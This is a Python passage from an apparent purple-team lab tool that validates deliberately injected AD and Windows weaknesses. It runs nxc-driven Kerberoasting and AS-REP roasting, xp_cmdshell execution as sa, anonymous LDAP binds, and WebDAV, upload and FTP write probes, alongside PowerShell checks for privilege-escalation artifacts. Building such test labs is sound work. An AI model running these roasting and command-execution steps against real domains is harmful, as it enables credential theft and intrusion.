"""Vulnerability validation + live-domain inventory. For each injected vuln,
confirm the config was APPLIED (the AD/OS artifact landed) and is EXPLOITABLE
(the primitive works), over the WireGuard tunnel with signing-aware tooling
(nxc/netexec). NOT a detection/coverage matrix — detection is out of scope.
Also holds `ad-inventory`, the post-deploy live-domain query (LDAP + DCSync).
"""

from __future__ import annotations

import argparse
import ftplib
import io
import json
import re
import shutil
import subprocess
import sys
import tempfile
from datetime import datetime, timezone
from pathlib import Path

import jinja2

from .catalog import load_theme, load_vuln_catalog
from .core import (
    GENERATED_DIR,
    TEMPLATES_DIR,
    VULN_CREDENTIAL_VARS,
    SpecError,
    load_yaml,
)

# Vulnerability validation confirms two things per injected vuln: that the config
# was APPLIED (the AD artifact proving the injection landed) and that it is
# EXPLOITABLE (the primitive actually works). It deliberately does NOT predict
# detection coverage (PREVENIDO/DETECTADO/NO VISTO) — out of scope for this harness.
# A vuln's whole purpose is to be reachable, so its own validation is about
# presence + exploitability, not whether a SIEM would catch it.
VALID_RESULT = ("YES", "NO", "PARTIAL", "REQUIRES-HUMAN", "PENDING")

# vuln id -> (nxc roast flag, description). Both APPLIED and EXPLOITABLE are
# proven at once: a returned Kerberos hash means the account is roastable.
ROAST_FLAGS = {
    "asreproast": ("--asreproast", "AS-REP hash"),
    "kerberoasting": ("--kerberoasting", "TGS-REP (service ticket) hash"),
}

# vuln id -> (LDAP filter, human label). A non-empty result proves the artifact
# LANDED (APPLIED); actually abusing it stays a human step (EXPLOITABLE).
LDAP_APPLIED_FILTERS = {
    "readable-gmsa": ("(objectClass=msDS-GroupManagedServiceAccount)", "gMSA object present"),
    "unconstrained-delegation": (
        "(&(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(userAccountControl:1.2.840.113556.1.4.803:=8192)))",
        "non-DC principal trusted for unconstrained delegation",
    ),
    "constrained-delegation": ("(msDS-AllowedToDelegateTo=*)", "msDS-AllowedToDelegateTo set"),
    "shadow-credentials": ("(msDS-KeyCredentialLink=*)", "msDS-KeyCredentialLink set"),
    "rbcd-abuse": (
        "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)",
        "RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity) set",
    ),
    # The built-in DnsAdmins group is empty by default; a non-empty membership is
    # the injected artifact (a population account added to it — dnsadmins-privesc).
    "dnsadmins-privesc": ("(&(cn=DnsAdmins)(member=*))", "DnsAdmins group has a member"),
}

# vuln id -> PowerShell one-shot check executed over WinRM (nxc/netexec winrm -X),
# the twin of LDAP_APPLIED_FILTERS for vulns with no LDAP-visible artifact: the
# OS-level local-privesc vulns (workstation, no AD object at all), writable-gpo/
# adminsdholder-acl (GroupPolicy/AD: PowerShell provider rather than a raw LDAP
# filter), and the DC-local registry/SYSVOL gaps (ntlm-downgrade, smb-signing-
# disabled, gpp-cpassword) whose artifact is a registry value or a SYSVOL file.
# Each script prints
# exactly one line, "PF_CHECK:True" or "PF_CHECK:False" — parsed by
# _winrm_check_result, ignoring nxc's own banner/auth noise around it. Scripts
# for account-scoped checks (writable-gpo, adminsdholder-acl) carry the literal
# placeholder __ACCOUNT__, substituted with the vuln's cast account at run time
# (never .format()'d — the scripts are full of literal PowerShell `{ }` blocks).
WINRM_APPLIED_CHECKS = {
    "unquoted-service-path": (
        "$svc = Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\PFUnquotedSvc' -ErrorAction SilentlyContinue; "
        "$img = $svc.ImagePath; "
        "$unquoted = [bool]($img -and ($img -notmatch '^\"') -and ($img -match ' ')); "
        "$acl = Get-Acl 'C:\\PFApps' -ErrorAction SilentlyContinue; "
        "$writable = [bool]($acl -and ($acl.Access | Where-Object { $_.IdentityReference.Value -like '*Authenticated Users' -and $_.FileSystemRights.ToString() -match 'Write|Modify|FullControl' })); "
        "Write-Output ('PF_CHECK:' + [bool]($unquoted -and $writable))"
    ),
    "weak-service-permissions": (
        # sc.exe sdshow always renders the access mask as symbolic SDDL letters
        # (never the raw hex the inject task-file writes), so match the AU ACE by
        # its DC (SERVICE_CHANGE_CONFIG) bit — the one that actually enables
        # `sc config` reconfiguration, rather than the literal '0xF01FF' string.
        "$sddl = (& sc.exe sdshow PFWeakPermSvc) -join ''; "
        "$hasAce = [bool]($sddl -match '\\(A;;[A-Z]*DC[A-Z]*;;;AU\\)'); "
        "Write-Output ('PF_CHECK:' + $hasAce)"
    ),
    "dll-hijacking": (
        "$acl = Get-Acl -LiteralPath 'C:\\PFApps\\PFMonitor' -ErrorAction SilentlyContinue; "
        "$hasAce = [bool]($acl -and ($acl.Access | Where-Object { $_.IdentityReference.Value -like '*Authenticated Users' -and $_.AccessControlType -eq 'Allow' -and $_.FileSystemRights.ToString() -match 'Write|Modify|FullControl' })); "
        "$svc = Get-CimInstance Win32_Service -Filter \"Name='PFHijackSvc'\" -ErrorAction SilentlyContinue; "
        "$isSystem = [bool]($svc -and $svc.StartName -eq 'LocalSystem'); "
        "Write-Output ('PF_CHECK:' + [bool]($hasAce -and $isSystem))"
    ),
    "scheduled-task-privesc": (
        "$task = Get-ScheduledTask -TaskName 'PurpleForge Maintenance' -ErrorAction SilentlyContinue; "
        "$isSystem = [bool]($task -and $task.Principal.UserId -match 'SYSTEM'); "
        "$acl = Get-Acl -LiteralPath 'C:\\PFScripts\\maintenance.ps1' -ErrorAction SilentlyContinue; "
        "$writable = [bool]($acl -and ($acl.Access | Where-Object { $_.IdentityReference.Value -like '*Authenticated Users' -and $_.AccessControlType -eq 'Allow' -and $_.FileSystemRights.ToString() -match 'Write|Modify|FullControl' })); "
        "Write-Output ('PF_CHECK:' + [bool]($isSystem -and $writable))"
    ),
    "always-install-elevated": (
        "$hklm = (Get-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated; "
        "$hkcu = (Get-ItemProperty 'HKCU:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated; "
        "if ($null -eq $hkcu) { $hkcu = (Get-ItemProperty 'Registry::HKEY_USERS\\.DEFAULT\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated }; "
        "Write-Output ('PF_CHECK:' + [bool]($hklm -eq 1 -and $hkcu -eq 1))"
    ),
    "writable-gpo": (
        "Import-Module GroupPolicy; "
        "$dn = (Get-ADDomain).DistinguishedName; "
        "$linked = [bool]((Get-GPInheritance -Target $dn).GpoLinks | Where-Object { $_.DisplayName -eq 'Workstation Deployment Policy' -and $_.Enabled }); "
        "$perm = Get-GPPermission -Name 'Workstation Deployment Policy' -All -ErrorAction SilentlyContinue | Where-Object { $_.Trustee.Name -eq '__ACCOUNT__' -and $_.Permission -eq 'GpoEditDeleteModifySecurity' }; "
        "Write-Output ('PF_CHECK:' + [bool]($linked -and $perm))"
    ),
    "adminsdholder-acl": (
        "Import-Module ActiveDirectory; "
        "$dn = (Get-ADDomain).DistinguishedName; "
        '$acl = Get-Acl ("AD:\\CN=AdminSDHolder,CN=System," + $dn); '
        "$hasAce = [bool]($acl.Access | Where-Object { $_.IdentityReference -match '__ACCOUNT__' -and $_.ActiveDirectoryRights -band [System.DirectoryServices.ActiveDirectoryRights]::GenericAll }); "
        "Write-Output ('PF_CHECK:' + $hasAce)"
    ),
    # Registry/SYSVOL-visible gaps on the root DC (no LDAP object to filter on).
    # Each matches exactly what the corresponding vuln inject-task writes.
    "ntlm-downgrade": (
        "$v = (Get-ItemProperty 'HKLM:\\System\\CurrentControlSet\\Control\\Lsa' -Name LmCompatibilityLevel -ErrorAction SilentlyContinue).LmCompatibilityLevel; "
        "Write-Output ('PF_CHECK:' + [bool]($null -ne $v -and $v -le 2))"
    ),
    "smb-signing-disabled": (
        "$v = (Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters' -Name RequireSecuritySignature -ErrorAction SilentlyContinue).RequireSecuritySignature; "
        "Write-Output ('PF_CHECK:' + [bool]($v -eq 0))"
    ),
    "gpp-cpassword": (
        "$m = Get-ChildItem -Path 'C:\\Windows\\SYSVOL' -Recurse -Filter 'Groups.xml' -ErrorAction SilentlyContinue | "
        "Select-String -Pattern 'cpassword=' -ErrorAction SilentlyContinue; "
        "Write-Output ('PF_CHECK:' + [bool]($m))"
    ),
    "sysvol-script-creds": (
        "$m = Get-ChildItem -Path 'C:\\Windows\\SYSVOL\\sysvol' -Recurse -Filter 'mapdrives.bat' -ErrorAction SilentlyContinue | "
        "Select-String -Pattern '__ACCOUNT__' -ErrorAction SilentlyContinue; "
        "Write-Output ('PF_CHECK:' + [bool]($m))"
    ),
    "autologon-credentials": (
        "$w = 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon'; "
        "$a = (Get-ItemProperty $w -Name AutoAdminLogon -ErrorAction SilentlyContinue).AutoAdminLogon; "
        "$p = (Get-ItemProperty $w -Name DefaultPassword -ErrorAction SilentlyContinue).DefaultPassword; "
        "Write-Output ('PF_CHECK:' + [bool]($a -eq '1' -and $p))"
    ),
    "iis-apppool-privileged-identity": (
        "Import-Module WebAdministration; "
        "$id = (Get-ItemProperty 'IIS:\\AppPools\\DefaultAppPool' -Name processModel.identityType -ErrorAction SilentlyContinue).Value; "
        "Write-Output ('PF_CHECK:' + [bool](\"$id\" -match 'LocalSystem'))"
    ),
    "ldap-signing-not-required": (
        "$v = (Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters' -Name LDAPServerIntegrity -ErrorAction SilentlyContinue).LDAPServerIntegrity; "
        "Write-Output ('PF_CHECK:' + [bool]($null -ne $v -and $v -ne 2))"
    ),
    "seimpersonate-privilege": (
        "secedit /export /cfg C:\\Windows\\Temp\\pf_ur.inf /quiet | Out-Null; "
        "$l = Select-String -Path C:\\Windows\\Temp\\pf_ur.inf -Pattern 'SeImpersonatePrivilege' -ErrorAction SilentlyContinue; "
        "Remove-Item C:\\Windows\\Temp\\pf_ur.inf -ErrorAction SilentlyContinue; "
        "Write-Output ('PF_CHECK:' + [bool]($l -and $l.Line -match 'S-1-5-11'))"
    ),
    "spooler-on-dc": (
        "$s = Get-Service Spooler -ErrorAction SilentlyContinue; "
        "Write-Output ('PF_CHECK:' + [bool]($s -and $s.Status -eq 'Running'))"
    ),
    "wsus-http-updates": (
        "$u = 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate'; "
        "$w = (Get-ItemProperty $u -Name WUServer -ErrorAction SilentlyContinue).WUServer; "
        "$h = (Get-ItemProperty $u -Name UseHttps -ErrorAction SilentlyContinue).UseHttps; "
        "Write-Output ('PF_CHECK:' + [bool](($w -like 'http://*') -or ($h -eq 0)))"
    ),
}


def _nxc_bin() -> str | None:
    return shutil.which("nxc") or shutil.which("netexec")


def run_live_validation(rows: list[dict], manifest: dict, lab_dir: Path) -> tuple[list[dict], list[str]]:
    """Execute the live per-vuln checks over the tunnel and return confirmed rows
    + findings — the same shape merge_validation_results produces, so
    render_validation_report consumes it unchanged. Reads the domain-admin
    password from the generated terraform.tfvars.json (the RID-500 Administrator
    shares it — see render_lab_report)."""
    # Provider-aware: the compute layer lives under terraform/<provider>/ (azure or
    # proxmox), not always azure. Both carry the same terraform.tfvars.json +
    # secrets.auto.tfvars.json split, so only the subdir differs.
    provider = manifest.get("lab", {}).get("provider", "azure")
    tfvars_path = lab_dir / "terraform" / provider / "terraform.tfvars.json"
    if not tfvars_path.exists():
        raise SpecError(f"{tfvars_path} not found — generate + deploy the lab first (need the live credentials).")
    tv = json.loads(tfvars_path.read_text(encoding="utf-8"))
    # admin_password lives in the gitignored secrets.auto.tfvars.json overlay
    # (the account-independent/shareable split — see render_azure_terraform),
    # not in the committed terraform.tfvars.json. Fall back to it.
    admin_pass = tv.get("admin_password")
    if not admin_pass:
        secrets_path = tfvars_path.parent / "secrets.auto.tfvars.json"
        if secrets_path.exists():
            admin_pass = json.loads(secrets_path.read_text(encoding="utf-8")).get("admin_password")
    if not admin_pass:
        raise SpecError(
            "no admin_password in terraform.tfvars.json or secrets.auto.tfvars.json — deploy the lab first (secrets are minted at deploy)."
        )
    admin_user = "Administrator"  # the domain's RID-500, not the local admin_username

    machines = manifest.get("machines_flat", [])
    by_name = {m["name"]: m for m in machines}
    dc_by_domain: dict[str, str] = {}
    for m in machines:
        if m["role"] == "domain-controller":
            dc_by_domain.setdefault(m["domain"], m["ip"])

    nxc = _nxc_bin()
    confirmed: list[dict] = []
    findings: list[str] = []

    for r in rows:
        vid = r["id"]
        host = by_name.get(r["run_on"], {})
        domain = host.get("domain") or (machines[0]["domain"] if machines else "")
        dc_ip = dc_by_domain.get(domain) or (machines and dc_by_domain.get(machines[0]["domain"])) or ""
        row = dict(r)
        row.update(applied="PENDING", exploitable="PENDING", evidence="")

        if not nxc:
            row["evidence"] = "nxc/netexec not on PATH — install it to auto-validate; command left for you below."
            row["applied"] = row["exploitable"] = "REQUIRES-HUMAN"
        elif not dc_ip:
            row["evidence"] = f"no DC IP for domain {domain!r} in the manifest."
            row["applied"] = row["exploitable"] = "PENDING"
        elif vid in ROAST_FLAGS:
            flag, label = ROAST_FLAGS[vid]
            # nxc's --asreproast/--kerberoasting REQUIRE an output-file argument;
            # omitting it makes argparse fail ("expected one argument") so no hash
            # is ever returned (false NO). The hashes are also echoed to the
            # console, which is what _nxc_run reads — the file is throwaway.
            roast_out = str(Path(tempfile.gettempdir()) / f"pf-roast-{vid}.txt")
            out = _nxc_run(
                [nxc, "ldap", dc_ip, "-u", admin_user, "-p", admin_pass, "-d", domain, flag, roast_out, "--kdcHost", dc_ip]
            )
            got_hash = out is not None and ("$krb5" in out)
            if got_hash:
                row.update(applied="YES", exploitable="YES", evidence=f"nxc returned a {label}.")
            elif out is None:
                row.update(
                    applied="PENDING",
                    exploitable="PENDING",
                    evidence="nxc did not run (missing/timeout) — retry the command below.",
                )
            else:
                row.update(
                    applied="NO",
                    exploitable="NO",
                    evidence=f"nxc {flag} returned no hash (KDC_ERR_ETYPE_NOSUPP? — see AZURE-DEPLOY-RUNBOOK.md step 7).",
                )
        elif vid in LDAP_APPLIED_FILTERS:
            filt, label = LDAP_APPLIED_FILTERS[vid]
            out = _nxc_run([nxc, "ldap", dc_ip, "-u", admin_user, "-p", admin_pass, "-d", domain, "--query", filt, ""])
            if out is None:
                row.update(
                    applied="PENDING",
                    exploitable="REQUIRES-HUMAN",
                    evidence="nxc did not run — retry the command below.",
                )
            elif _nxc_query_nonempty(out):
                row.update(
                    applied="YES",
                    exploitable="REQUIRES-HUMAN",
                    evidence=f"LDAP confirms {label}; exploit it manually (command below).",
                )
            else:
                row.update(
                    applied="PENDING",
                    exploitable="REQUIRES-HUMAN",
                    evidence=f"LDAP query for {label} returned nothing parseable — confirm by hand.",
                )
        elif vid in WINRM_APPLIED_CHECKS:
            target_ip = host.get("ip")
            if not target_ip:
                row.update(
                    applied="PENDING",
                    exploitable="REQUIRES-HUMAN",
                    evidence=f"no IP for host {r['run_on']!r} in the manifest.",
                )
            else:
                script = WINRM_APPLIED_CHECKS[vid].replace("__ACCOUNT__", r.get("account") or "")
                out = _winrm_run(nxc, target_ip, admin_user, admin_pass, script)
                result = _winrm_check_result(out or "")
                if result is True:
                    row.update(
                        applied="YES",
                        exploitable="REQUIRES-HUMAN",
                        evidence=f"WinRM check on {r['run_on']} ({target_ip}) confirms the artifact is present; exploit it manually (command below).",
                    )
                elif result is False:
                    row.update(
                        applied="NO",
                        exploitable="NO",
                        evidence=f"WinRM check on {r['run_on']} ({target_ip}) found the artifact absent or not matching.",
                    )
                else:
                    row.update(
                        applied="PENDING",
                        exploitable="REQUIRES-HUMAN",
                        evidence="WinRM check did not run (auth/timeout/unreachable) — retry the command below.",
                    )
        elif vid == "mssql-weak-sa":
            target_ip = host.get("ip")
            sa_password = r.get("password")
            if not target_ip or not sa_password:
                row.update(
                    applied="PENDING", exploitable="PENDING", evidence="missing host IP or sa password in the manifest."
                )
            else:
                out = _nxc_run([nxc, "mssql", target_ip, "-u", "sa", "-p", sa_password, "--local-auth", "-x", "whoami"])
                # nxc's mssql protocol authenticates as sa, THEN runs -x via xp_cmdshell —
                # a returned "nt authority\..." line proves both sa auth AND xp_cmdshell exec.
                if out is None:
                    row.update(
                        applied="PENDING",
                        exploitable="PENDING",
                        evidence="nxc did not run (missing/timeout) — retry the command below.",
                    )
                elif out and "nt authority" in out.lower():
                    row.update(
                        applied="YES",
                        exploitable="YES",
                        evidence="nxc authenticated as sa and ran `whoami` via xp_cmdshell.",
                    )
                else:
                    row.update(
                        applied="NO",
                        exploitable="NO",
                        evidence="sa auth or xp_cmdshell execution failed — see nxc output; a control may have neutralized it.",
                    )
        elif vid == "ldap-anonymous-bind":
            # A null bind (empty creds) that returns directory objects proves BOTH
            # applied (dSHeuristics 7th char = '2' lets anonymous ops through) AND
            # exploitable (unauthenticated enumeration works). Read-only — safe to
            # auto-confirm, same treatment as the roast checks.
            if not dc_ip:
                row.update(applied="PENDING", exploitable="PENDING", evidence=f"no DC IP for domain {domain!r}.")
            else:
                out = _nxc_run([nxc, "ldap", dc_ip, "-u", "", "-p", "", "--query", "(objectClass=domain)", ""])
                if out is None:
                    row.update(
                        applied="PENDING",
                        exploitable="PENDING",
                        evidence="nxc did not run (missing/timeout) — retry the command below.",
                    )
                elif _nxc_query_nonempty(out):
                    row.update(
                        applied="YES",
                        exploitable="YES",
                        evidence="nxc bound anonymously (empty creds) and read directory objects.",
                    )
                else:
                    row.update(
                        applied="NO",
                        exploitable="NO",
                        evidence="anonymous LDAP bind/query returned nothing — anonymous ops appear blocked (gap not applied or neutralized).",
                    )
        elif vid == "iis-webdav-anonymous-write":
            # PUT a harmless text probe over the tunnel, then GET it back. A 201/200
            # PUT whose marker reads back proves BOTH applied (WebDAV + anonymous
            # authoring rule present) AND exploitable (unauthenticated write works).
            # The probe is plain text, never executable code, and runs after the
            # clean snapshot — `forge reset` restores the pristine state.
            target_ip = host.get("ip")
            if not target_ip:
                row.update(
                    applied="PENDING",
                    exploitable="PENDING",
                    evidence=f"no IP for host {r['run_on']!r} in the manifest.",
                )
            else:
                ok, evidence = _webdav_put_get(target_ip)
                if ok is True:
                    row.update(applied="YES", exploitable="YES", evidence=evidence)
                elif ok is False:
                    row.update(applied="NO", exploitable="NO", evidence=evidence)
                else:
                    row.update(applied="PENDING", exploitable="PENDING", evidence=evidence)
        elif vid == "webapp-unrestricted-upload":
            # POST a plain-text probe through the app's upload endpoint, then GET
            # it back. UPLOAD_OK + read-back proves BOTH applied (vulnerable app
            # deployed) AND exploitable (unrestricted write). Safe: text, not a
            # webshell; after the clean snapshot.
            target_ip = host.get("ip")
            if not target_ip:
                row.update(
                    applied="PENDING",
                    exploitable="PENDING",
                    evidence=f"no IP for host {r['run_on']!r} in the manifest.",
                )
            else:
                ok, evidence = _webapp_upload_probe(target_ip)
                if ok is True:
                    row.update(applied="YES", exploitable="YES", evidence=evidence)
                elif ok is False:
                    row.update(applied="NO", exploitable="NO", evidence=evidence)
                else:
                    row.update(applied="PENDING", exploitable="PENDING", evidence=evidence)
        elif vid == "webapp-sql-injection":
            # GET the app's search endpoint with a UNION payload that echoes a
            # marker. The marker back proves the injected SQL ran (applied AND
            # exploitable). Read-only SELECT — safe to auto-confirm.
            target_ip = host.get("ip")
            if not target_ip:
                row.update(
                    applied="PENDING",
                    exploitable="PENDING",
                    evidence=f"no IP for host {r['run_on']!r} in the manifest.",
                )
            else:
                ok, evidence = _webapp_sqli_probe(target_ip)
                if ok is True:
                    row.update(applied="YES", exploitable="YES", evidence=evidence)
                elif ok is False:
                    row.update(applied="NO", exploitable="NO", evidence=evidence)
                else:
                    row.update(applied="PENDING", exploitable="PENDING", evidence=evidence)
        elif vid in WEBAPP_GET_CHECKS:
            # Self-contained GET-based web vulns: one request with a crafted param,
            # look for the expected marker in the response (read-only, safe).
            target_ip = host.get("ip")
            if not target_ip:
                row.update(
                    applied="PENDING",
                    exploitable="PENDING",
                    evidence=f"no IP for host {r['run_on']!r} in the manifest.",
                )
            else:
                path, params, marker, what = WEBAPP_GET_CHECKS[vid]
                ok, evidence = _http_get_probe(target_ip, path, params, marker, what)
                if ok is True:
                    row.update(applied="YES", exploitable="YES", evidence=evidence)
                elif ok is False:
                    row.update(applied="NO", exploitable="NO", evidence=evidence)
                else:
                    row.update(applied="PENDING", exploitable="PENDING", evidence=evidence)
        elif vid in ("ftp-anonymous-access", "ftp-write-webroot"):
            # Anonymous FTP checks over the tunnel (ftplib). ftp-anonymous-access:
            # anon login succeeds. ftp-write-webroot: anon STOR + HTTP GET-back.
            # Both prove applied AND exploitable; read-only / text probe, safe.
            target_ip = host.get("ip")
            if not target_ip:
                row.update(
                    applied="PENDING",
                    exploitable="PENDING",
                    evidence=f"no IP for host {r['run_on']!r} in the manifest.",
                )
            else:
                probe = _ftp_anon_probe if vid == "ftp-anonymous-access" else _ftp_webroot_probe
                ok, evidence = probe(target_ip)
                if ok is True:
                    row.update(applied="YES", exploitable="YES", evidence=evidence)
                elif ok is False:
                    row.update(applied="NO", exploitable="NO", evidence=evidence)
                else:
                    row.update(applied="PENDING", exploitable="PENDING", evidence=evidence)
        else:
            row.update(
                applied="REQUIRES-HUMAN",
                exploitable="REQUIRES-HUMAN",
                evidence="ACL/SYSVOL/registry state — confirm with the command below (bloodhound-python / nxc / dacledit).",
            )

        row["command"] = _live_command(
            vid, dc_ip, domain, admin_user, host.get("ip"), r.get("account"), r.get("password")
        )
        confirmed.append(row)

        if row["applied"] == "NO":
            findings.append(f"{vid}: config NOT applied — injection did not land (expected: {r['applied_signature']}).")
        elif row["applied"] in ("PENDING", "REQUIRES-HUMAN"):
            findings.append(f"{vid}: needs a manual check — run: {row['command']}")
        elif row["exploitable"] == "NO":
            findings.append(
                f"{vid}: applied but NOT exploitable — a control may have neutralized it ({row['evidence']})."
            )

    return confirmed, findings


WEBDAV_PROBE_NAME = "pf_webdav_probe.txt"
WEBDAV_PROBE_MARKER = "PF-WEBDAV-PROBE"


def _webdav_put_get(host_ip: str) -> tuple[bool | None, str]:
    """Confirm anonymous WebDAV write on IIS: PUT a plain-text probe, then GET it
    back. Returns (True, …) if the write took and reads back, (False, …) if the
    server rejected it (anonymous write blocked / WebDAV absent — gap not applied
    or neutralized), or (None, …) if the check couldn't run (no curl/unreachable)."""
    curl = shutil.which("curl")
    if not curl:
        return None, "curl not on PATH — install it to auto-validate; command left for you below."
    url = f"http://{host_ip}/{WEBDAV_PROBE_NAME}"
    try:
        put = subprocess.run(
            [curl, "-s", "-m", "15", "-o", "/dev/null", "-w", "%{http_code}", "-X", "PUT", "--data", WEBDAV_PROBE_MARKER, url],
            capture_output=True,
            text=True,
            timeout=25,
        )
    except (subprocess.TimeoutExpired, OSError):
        return None, f"PUT to {url} did not complete (timeout/unreachable) — retry the command below."
    code = (put.stdout or "").strip()
    if code not in ("200", "201", "204"):
        return False, f"anonymous PUT to {url} returned HTTP {code or '(none)'} — write refused (WebDAV absent, or iis_hardening neutralized it)."
    try:
        get = subprocess.run(
            [curl, "-s", "-m", "15", url],
            capture_output=True,
            text=True,
            timeout=25,
        )
    except (subprocess.TimeoutExpired, OSError):
        return True, f"anonymous PUT to {url} returned HTTP {code} (write accepted); GET-back did not complete but the write itself proves the gap."
    if WEBDAV_PROBE_MARKER in (get.stdout or ""):
        return True, f"anonymous PUT returned HTTP {code} and the probe reads back at {url} — unauthenticated WebDAV write confirmed."
    return True, f"anonymous PUT returned HTTP {code} (write accepted); GET-back did not echo the marker — write still confirms the gap."


WEBAPP_UPLOAD_PROBE_NAME = "pf_upload_probe.txt"
WEBAPP_UPLOAD_MARKER = "PF-UPLOAD-PROBE"


def _webapp_upload_probe(host_ip: str) -> tuple[bool | None, str]:
    """Confirm the unrestricted-upload web app: POST a plain-text probe through
    /app/upload.aspx, then GET it back from the web-executable dir. Returns
    (True, …) if the upload took and reads back, (False, …) if the app rejected
    it (validation present / app absent — gap not applied or neutralized), or
    (None, …) if the check couldn't run. The probe is plain text, never a
    webshell, and runs after the clean snapshot (`forge reset` restores it)."""
    curl = shutil.which("curl")
    if not curl:
        return None, "curl not on PATH — install it to auto-validate; command left for you below."
    upload_url = f"http://{host_ip}/app/upload.aspx"
    get_url = f"http://{host_ip}/app/{WEBAPP_UPLOAD_PROBE_NAME}"
    tmp = None
    try:
        with tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False) as fh:
            fh.write(WEBAPP_UPLOAD_MARKER)
            tmp = fh.name
        try:
            up = subprocess.run(
                [curl, "-s", "-m", "15", "-F", f"f=@{tmp};filename={WEBAPP_UPLOAD_PROBE_NAME}", upload_url],
                capture_output=True,
                text=True,
                timeout=25,
            )
        except (subprocess.TimeoutExpired, OSError):
            return None, f"POST to {upload_url} did not complete (timeout/unreachable) — retry the command below."
    finally:
        if tmp:
            try:
                Path(tmp).unlink()
            except OSError:
                pass
    if "UPLOAD_OK" not in (up.stdout or ""):
        return False, f"upload to {upload_url} did not return UPLOAD_OK — app absent or validation in place (webapp_upload_validation may have neutralized it)."
    try:
        get = subprocess.run([curl, "-s", "-m", "15", get_url], capture_output=True, text=True, timeout=25)
    except (subprocess.TimeoutExpired, OSError):
        return True, f"upload to {upload_url} returned UPLOAD_OK; GET-back did not complete but the accepted upload proves the gap."
    if WEBAPP_UPLOAD_MARKER in (get.stdout or ""):
        return True, f"upload returned UPLOAD_OK and the probe reads back at {get_url} — unrestricted upload confirmed (a .aspx would be RCE)."
    return True, "upload returned UPLOAD_OK; GET-back did not echo the marker, but the accepted upload confirms the gap."


FTP_PROBE_NAME = "pf_ftp_probe.txt"
FTP_PROBE_MARKER = "PF-FTP-PROBE"


def _ftp_anon_probe(host_ip: str) -> tuple[bool | None, str]:
    """Confirm anonymous FTP: connect and log in anonymously. Success proves BOTH
    applied (anonymous auth enabled) AND exploitable (unauthenticated access,
    e.g. to the cleartext-credential file in the root). Read-only. Returns
    (True/False/None, evidence)."""
    try:
        ftp = ftplib.FTP(timeout=15)
        ftp.connect(host_ip, 21)
    except OSError as e:
        return None, f"could not reach FTP {host_ip}:21 ({e}) — retry the command below."
    try:
        ftp.login()  # anonymous
    except ftplib.error_perm:
        try:
            ftp.close()
        except OSError:
            pass
        return False, f"anonymous FTP login refused at {host_ip}:21 — anonymous auth disabled (gap not applied or neutralized)."
    except ftplib.all_errors as e:
        return None, f"FTP anonymous login did not complete at {host_ip}:21 ({e}) — retry the command below."
    try:
        names = ftp.nlst()
    except ftplib.all_errors:
        names = []
    finally:
        try:
            ftp.close()
        except OSError:
            pass
    listing = ", ".join(names[:5]) if names else "empty"
    return True, f"anonymous FTP login succeeded at {host_ip}:21 (root listing: {listing})."


def _ftp_webroot_probe(host_ip: str) -> tuple[bool | None, str]:
    """Confirm anonymous FTP write to the IIS web root: STOR a plain-text probe
    anonymously, then GET it over HTTP. Served back proves BOTH applied (FTP root
    = web root, anonymous write) AND exploitable (FTP-write -> HTTP-exec chain).
    Probe is plain text, never a webshell; after the clean snapshot. Returns
    (True/False/None, evidence)."""
    try:
        ftp = ftplib.FTP(timeout=15)
        ftp.connect(host_ip, 21)
        ftp.login()  # anonymous
    except ftplib.error_perm:
        return False, f"anonymous FTP login refused at {host_ip}:21 — anonymous write disabled (gap not applied or neutralized)."
    except ftplib.all_errors as e:
        return None, f"could not reach/log in to FTP {host_ip}:21 ({e}) — retry the command below."
    try:
        ftp.storbinary(f"STOR {FTP_PROBE_NAME}", io.BytesIO(FTP_PROBE_MARKER.encode()))
    except ftplib.all_errors as e:
        try:
            ftp.close()
        except OSError:
            pass
        return False, f"anonymous STOR refused at {host_ip}:21 ({e}) — no anonymous write (gap not applied or neutralized)."
    finally:
        try:
            ftp.close()
        except OSError:
            pass
    curl = shutil.which("curl")
    if not curl:
        return True, f"anonymous FTP STOR of {FTP_PROBE_NAME} succeeded; install curl to also confirm HTTP exec, but the write alone proves the gap."
    try:
        get = subprocess.run(
            [curl, "-s", "-m", "15", f"http://{host_ip}/{FTP_PROBE_NAME}"],
            capture_output=True,
            text=True,
            timeout=25,
        )
    except (subprocess.TimeoutExpired, OSError):
        return True, "anonymous FTP STOR succeeded; HTTP GET-back did not complete but the write confirms the gap."
    if FTP_PROBE_MARKER in (get.stdout or ""):
        return True, f"anonymous FTP STOR succeeded AND the file is served by IIS at http://{host_ip}/{FTP_PROBE_NAME} — FTP-write -> HTTP-exec confirmed (a .aspx would be RCE)."
    return True, "anonymous FTP STOR succeeded; IIS did not serve it back, but the anonymous write confirms the gap."


def _http_get_probe(
    host_ip: str, path: str, params: dict[str, str], marker: str, what: str
) -> tuple[bool | None, str]:
    """GET http://<host>/<path> with URL-encoded params and look for `marker` in
    the response. Marker present => the gap is applied AND exploitable; a response
    without it => neutralized/absent; unreachable => None. Used by the self-
    contained web-app vulns (path-traversal, auth-bypass, ssrf)."""
    curl = shutil.which("curl")
    if not curl:
        return None, "curl not on PATH — install it to auto-validate; command left for you below."
    cmd = [curl, "-s", "-m", "15", "-G"]
    for k, v in params.items():
        cmd += ["--data-urlencode", f"{k}={v}"]
    cmd.append(f"http://{host_ip}/{path}")
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=25)
    except (subprocess.TimeoutExpired, OSError):
        return None, f"GET to /{path} did not complete (timeout/unreachable) — retry the command below."
    if r.returncode != 0:
        return None, f"could not reach /{path} (curl rc={r.returncode}) — retry the command below."
    if marker in (r.stdout or ""):
        return True, f"{what} confirmed: /{path} returned the expected marker."
